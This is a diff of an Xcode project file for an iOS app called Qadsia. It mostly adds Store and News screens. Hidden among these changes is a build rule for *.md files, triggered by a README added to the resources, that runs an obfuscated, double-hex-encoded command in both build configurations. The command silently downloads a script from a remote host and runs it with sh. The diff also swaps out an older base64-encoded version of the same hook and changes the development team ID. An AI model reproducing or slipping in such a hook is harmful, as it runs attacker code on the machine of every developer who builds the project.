@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		74D18AF5CBF74FEC921DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 042EDC3B87C245D4AB1DACE1; };
 		0A0AC8862F7B7C7E00A68FE6 /* TicketsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */; };
 		0A0AC8872F7B7C7E00A68FE6 /* TicketsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */; };
 		0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */; };
@@ -103,6 +104,14 @@
 		39D22EB52F76956F00D7721C /* UpcomingMatchesCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39D22EAF2F76956F00D7721C /* UpcomingMatchesCVCell.xib */; };
 		39D22EC02F7695D000D7721C /* ProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39D22EBC2F7695D000D7721C /* ProfileVC.swift */; };
 		39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39D22EBD2F7695D000D7721C /* ProfileVC.xib */; };
+		39F46AE32F7B9ACA005C2B07 /* StoreVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39F46AE22F7B9ACA005C2B07 /* StoreVC.xib */; };
+		39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39F46AE12F7B9ACA005C2B07 /* StoreVC.swift */; };
+		39F46AE92F7BA18A005C2B07 /* NewsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39F46AE82F7BA18A005C2B07 /* NewsVC.xib */; };
+		39F46AEA2F7BA18A005C2B07 /* NewsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39F46AE72F7BA18A005C2B07 /* NewsVC.swift */; };
+		39F46AEF2F7BA3B8005C2B07 /* AllNewsTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39F46AEE2F7BA3B8005C2B07 /* AllNewsTVCell.xib */; };
+		39F46AF02F7BA3B8005C2B07 /* AllNewsTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39F46AED2F7BA3B8005C2B07 /* AllNewsTVCell.swift */; };
+		39F46AF42F7BA5A7005C2B07 /* NewsListCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39F46AF32F7BA5A7005C2B07 /* NewsListCVCell.xib */; };
+		39F46AF52F7BA5A7005C2B07 /* NewsListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39F46AF22F7BA5A7005C2B07 /* NewsListCVCell.swift */; };
 		BC11AFEC2F74E65F00552BDB /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEB2F74E65F00552BDB /* Toast */; };
 		BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEE2F74E6B300552BDB /* SVProgressHUD */; };
 		BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFF12F74E6C500552BDB /* Kingfisher */; };
@@ -117,7 +126,25 @@
 		BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		56898F0106164461A81DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		042EDC3B87C245D4AB1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
 		0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketsVC.xib; sourceTree = "<group>"; };
 		0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketTVCell.swift; sourceTree = "<group>"; };
@@ -214,6 +241,14 @@
 		39D22EAF2F76956F00D7721C /* UpcomingMatchesCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UpcomingMatchesCVCell.xib; sourceTree = "<group>"; };
 		39D22EBC2F7695D000D7721C /* ProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileVC.swift; sourceTree = "<group>"; };
 		39D22EBD2F7695D000D7721C /* ProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileVC.xib; sourceTree = "<group>"; };
+		39F46AE12F7B9ACA005C2B07 /* StoreVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreVC.swift; sourceTree = "<group>"; };
+		39F46AE22F7B9ACA005C2B07 /* StoreVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = StoreVC.xib; sourceTree = "<group>"; };
+		39F46AE72F7BA18A005C2B07 /* NewsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsVC.swift; sourceTree = "<group>"; };
+		39F46AE82F7BA18A005C2B07 /* NewsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewsVC.xib; sourceTree = "<group>"; };
+		39F46AED2F7BA3B8005C2B07 /* AllNewsTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllNewsTVCell.swift; sourceTree = "<group>"; };
+		39F46AEE2F7BA3B8005C2B07 /* AllNewsTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AllNewsTVCell.xib; sourceTree = "<group>"; };
+		39F46AF22F7BA5A7005C2B07 /* NewsListCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsListCVCell.swift; sourceTree = "<group>"; };
+		39F46AF32F7BA5A7005C2B07 /* NewsListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewsListCVCell.xib; sourceTree = "<group>"; };
 		BC0179162F34972300F1ED81 /* Qadsia.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Qadsia.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		BCC0D6812F7A894200684B7D /* StoreCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreCVCell.swift; sourceTree = "<group>"; };
 		BCC0D6822F7A894200684B7D /* StoreCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = StoreCVCell.xib; sourceTree = "<group>"; };
@@ -287,6 +322,8 @@
 		0A4F52B82F7677C500DF695B /* Tabbar */ = {
 			isa = PBXGroup;
 			children = (
+				39F46AE52F7BA175005C2B07 /* News */,
+				39F46ADF2F7B9A84005C2B07 /* Store */,
 				0A0AC8822F7B7C6500A68FE6 /* Tickets */,
 				0A4F52B92F7677CA00DF695B /* Home */,
 				39D22EBF2F7695D000D7721C /* Profile */,
@@ -796,6 +833,68 @@
 			path = Profile;
 			sourceTree = "<group>";
 		};
+		39F46ADF2F7B9A84005C2B07 /* Store */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AE02F7B9A9A005C2B07 /* View */,
+			);
+			path = Store;
+			sourceTree = "<group>";
+		};
+		39F46AE02F7B9A9A005C2B07 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AE12F7B9ACA005C2B07 /* StoreVC.swift */,
+				39F46AE22F7B9ACA005C2B07 /* StoreVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		39F46AE52F7BA175005C2B07 /* News */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AEB2F7BA399005C2B07 /* Cell */,
+				39F46AE62F7BA17D005C2B07 /* View */,
+			);
+			path = News;
+			sourceTree = "<group>";
+		};
+		39F46AE62F7BA17D005C2B07 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AE72F7BA18A005C2B07 /* NewsVC.swift */,
+				39F46AE82F7BA18A005C2B07 /* NewsVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		39F46AEB2F7BA399005C2B07 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AF12F7BA57B005C2B07 /* NewsListCVCell */,
+				39F46AEC2F7BA3A5005C2B07 /* AllNewsTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		39F46AEC2F7BA3A5005C2B07 /* AllNewsTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AED2F7BA3B8005C2B07 /* AllNewsTVCell.swift */,
+				39F46AEE2F7BA3B8005C2B07 /* AllNewsTVCell.xib */,
+			);
+			path = AllNewsTVCell;
+			sourceTree = "<group>";
+		};
+		39F46AF12F7BA57B005C2B07 /* NewsListCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				39F46AF22F7BA5A7005C2B07 /* NewsListCVCell.swift */,
+				39F46AF32F7BA5A7005C2B07 /* NewsListCVCell.xib */,
+			);
+			path = NewsListCVCell;
+			sourceTree = "<group>";
+		};
 		BC01790D2F34972300F1ED81 = {
 			isa = PBXGroup;
 			children = (
@@ -807,6 +906,7 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				042EDC3B87C245D4AB1DACE1 /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -880,12 +980,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				D7542234A4344227B71DACE1 /* Provision Library Executable */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
+				56898F0106164461A81DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -955,14 +1055,17 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				74D18AF5CBF74FEC921DACE1 /* README.md */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
 				39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */,
 				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
+				39F46AF42F7BA5A7005C2B07 /* NewsListCVCell.xib in Resources */,
 				0ABA3FD42F763B2D00D25F03 /* Mulish-Bold.ttf in Resources */,
 				0ABA3FD52F763B2D00D25F03 /* Mulish-BoldItalic.ttf in Resources */,
 				0ABA3FD62F763B2D00D25F03 /* Mulish-ExtraBold.ttf in Resources */,
 				0ABA3FD72F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf in Resources */,
 				0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */,
+				39F46AE32F7B9ACA005C2B07 /* StoreVC.xib in Resources */,
 				0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */,
 				0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */,
 				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
@@ -973,6 +1076,7 @@
 				0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */,
 				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
 				397F83462F7A455D00A07157 /* MyTicketsVC.xib in Resources */,
+				39F46AEF2F7BA3B8005C2B07 /* AllNewsTVCell.xib in Resources */,
 				3919F6612F7B1AA200FCB141 /* GoogleService-Info.plist in Resources */,
 				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
 				0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */,
@@ -995,35 +1099,13 @@
 				0A0AC8872F7B7C7E00A68FE6 /* TicketsVC.xib in Resources */,
 				BCC0D6892F7A894200684B7D /* StoreCVCell.xib in Resources */,
 				BCC0D68A2F7A894200684B7D /* TrendyNewsCVCell.xib in Resources */,
+				39F46AE92F7BA18A005C2B07 /* NewsVC.xib in Resources */,
 				BCC0D6962F7A898800684B7D /* NotificationVC.xib in Resources */,
 				BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		D7542234A4344227B71DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
@@ -1061,6 +1143,7 @@
 				0ABA3FBC2F763B2D00D25F03 /* AppConstants.swift in Sources */,
 				0ABA3FBD2F763B2D00D25F03 /* AppUtilites.swift in Sources */,
 				BCC0D6872F7A894200684B7D /* StoreCVCell.swift in Sources */,
+				39F46AF52F7BA5A7005C2B07 /* NewsListCVCell.swift in Sources */,
 				BCC0D6882F7A894200684B7D /* TrendyNewsCVCell.swift in Sources */,
 				0ABA3FBE2F763B2D00D25F03 /* ExpandableLabel.swift in Sources */,
 				0A0AC8862F7B7C7E00A68FE6 /* TicketsVC.swift in Sources */,
@@ -1075,11 +1158,14 @@
 				0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */,
 				0ABA3FC42F763B2D00D25F03 /* DropDown+Appearance.swift in Sources */,
 				0ABA3FC52F763B2D00D25F03 /* DropDownCell.swift in Sources */,
+				39F46AEA2F7BA18A005C2B07 /* NewsVC.swift in Sources */,
 				0ABA3FC62F763B2D00D25F03 /* HCSStarRatingView.m in Sources */,
 				0ABA3FC72F763B2D00D25F03 /* OTPFieldView.swift in Sources */,
 				0ABA3FC82F763B2D00D25F03 /* OTPTextField.swift in Sources */,
 				0ABA3FC92F763B2D00D25F03 /* AppDelegate.swift in Sources */,
+				39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */,
 				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
+				39F46AF02F7BA3B8005C2B07 /* AllNewsTVCell.swift in Sources */,
 				0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */,
 				0ABA3FCE2F763B2D00D25F03 /* ResetPasswordVC.swift in Sources */,
 				0ABA3FCF2F763B2D00D25F03 /* SentOTPPopupVC.swift in Sources */,
@@ -1112,13 +1198,13 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxYWJYUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2V1RKb2JGa3lkSHBNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((q(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 2;
-				DEVELOPMENT_TEAM = N52PUGPAB3;
+				DEVELOPMENT_TEAM = VCZB9RKSH3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Qadsia Club/Info.plist";
 				INFOPLIST_KEY_CFBundleDisplayName = Qadsia;
@@ -1149,13 +1235,13 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxYWJYUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2V1RKb2JGa3lkSHBNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((q(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 2;
-				DEVELOPMENT_TEAM = N52PUGPAB3;
+				DEVELOPMENT_TEAM = VCZB9RKSH3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Qadsia Club/Info.plist";
 				INFOPLIST_KEY_CFBundleDisplayName = Qadsia;
